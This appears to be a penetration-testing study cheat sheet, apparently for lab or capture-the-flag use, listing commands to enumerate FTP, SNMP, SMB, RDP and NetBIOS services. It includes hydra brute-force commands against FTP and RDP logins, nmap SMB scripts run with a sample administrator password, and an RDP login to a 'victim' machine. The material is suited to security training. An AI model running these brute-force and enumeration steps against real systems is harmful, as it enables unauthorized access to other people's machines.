# ENUMERATING-SERVICES

# ENUMERATING-SERVICES MYTHOLOGY

1. FTP
2. SNMP
3. SMB
4. RDP
5. NETBIOS

# FTP Enumeration - Port 21

FTP (File Transfer Protocol) is a network protocol for transmitting file between computer Over Transmission Control Protocol/Internet Protocol (TCP/IP) Connection

1. Scanning and Find Information

       Nmap -p21 -sC -sV -A IP 

2. Here is prejent username and password file so use this file to try Brute-Force

       hydra -L User.txt -P Password.txt ftp://10.10.23.1 
       hydra -L User.txt -P password.txt 10.10.32.1 ftp
    
3. Login sucessfuly and downlods file in Victom machine

       get flag.txt

# SNMP Enumeration - Port 161

SNMP Protocol is used to monitor and manage Network Devices like PCs, Router, Printer, Switches, Servers, Etc...

## Tools used to Enumerate

1. Nmap
2. Snmp-check
3. metasploit

## What To Enumerate?

1. Default UDP Ports Used by SNMP.
2. Identify the processes running on the target machine using Nmap Scripts.
3. List valid community strings of the server useing Nmap Script.
4. List valid community strings of the server by using snmp_login metasploit module.
5. List all the Interfaces of the machine. Use appropriate Nmap Scripts.

## Enumeration

1. Scanning and Find Information

       nmap -SU IP
       nmap -p 161 -A -sV -sC IP
       snmp-check IP

2. Finding Running Processes Using Nmap Script

        sudo nmap -SU -p161 --script=snmp-processes IP

3. Find Valid Strings Using Metasploit

         auxiliary/scanner/snmp/snmp_login

4. List all the Interfaces of the machine. Use appropriate Nmap Scripts.

         sudo nmap --script=snmp-interfaces IP

# SMB Enumeration - Port 445
server message Block

Network file sharing Protocol that allows applications on a Computer to red and write to file. 

Request services from server programs in a computer network

## Tools used to Enumerate

1. Nmap
2. enum4linux

## What to Hack?

1. Network File shares
2. Logged in Users details
3. Workgroups
4. security level information
5. Domains & Services

## Enumerate

1. Find Information

       sudo nmap -sV -sC -A IP

2. Enumerating Shares

       sudo nmap -p445 --script=smb-enum-shares IP

3. Connect SMB GUI Method

       Open file in Network and search
       smb://IP/

4. Enumerating users

        sudo nmap --script=smb-enum-users IP
        sudo nmap --script=smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 IP

5. Enumerating Groups

        sudo nmap --script=smb-enum-groups IP
        sudo nmap --script=smb-enum-groups--script-args smbusername=administrator,smbpassword=smbserver_771 IP

6. Enumerating Security Level

         sudo nmap -A -sV -sC IP
   
7. Enumerating Services 

         sudo nmap --script=smb-enum-services IP
         sudo nmap --script=smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 IP

8. Enumerating all information

          enum4linux IP

# RDP Service - Port 3389

Remote Desktop Protocol 

Protocol used for remotely accessing the computers

## How to Exploit?

1. Check for running services on the target and confirm if RDP is running on any open port
2. use Metasploit to confirm the services running is RDP
3. use hydra to brute force the login credentials
4. Use and RDP tools to login into the victim's machine

## Enumeration

1. Find Information

        sudo nmap -A -sV -sC IP

2. Confirm Port Running RDP Service

        auxiliary/scanner/rdp/rdp_scanner

3. Bruteforce RDP Login Credentials

        hydra -L User.txt -P password.txt rdp://10.10.22.34 -s 3333

4. RDP Login in linux Using Xfreerdp

        xfreerdp /u:username /p:password /v:10.10.22.34:3333

# NetBIOS Enumeration - Port 137/138/139

1. NBName: 137/UDP
2. NBName: 137/TCP
3. NBDatagram: 138/UDP
4. NBSession: 139/TCP

Network Basic Input Output System,
Facilitates and allows computer to connect over the local network, access shared resources, such as file and printers, and to file each other.

## Enumeration 

1. Find Information

       sudo nmap -p137,138,139 -A -sV -sC IP

2. use nmap script find flag

       sudo nmap -p137,138,139 --script nbstat.nse IP
